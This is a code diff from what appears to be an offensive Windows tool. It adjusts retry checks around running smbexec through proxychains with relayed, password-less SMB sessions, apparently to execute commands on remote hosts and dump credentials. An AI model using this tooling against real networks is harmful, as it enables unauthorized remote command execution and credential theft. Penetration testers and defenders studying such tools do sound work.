@@ -242,7 +242,7 @@ class SMBEXECShell():
                                 printnlog('{}: {}'.format(addr, data_out))
                             else:
                                 lognoprint('{}: {}'.format(addr, data_out))
-                            if retries >= 12:
+                            if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                                 printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, addr))
                                 break
                             else:
@@ -263,7 +263,7 @@ class SMBEXECShell():
                                 printnlog('{}: {}'.format(addr, data_out))
                             else:
                                 lognoprint('{}: {}'.format(addr, data_out))
-                            if retries >= 12:
+                            if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                                 printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, addr))
                                 break
                             else:
@@ -2143,7 +2143,7 @@ def relayx_dump(reaper_command):
                         retries = 0
                         while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1: # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
                             data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
-                            if retries >= 12:
+                            if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                                 printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, relayx_dat[1]))
                                 break
                             else:
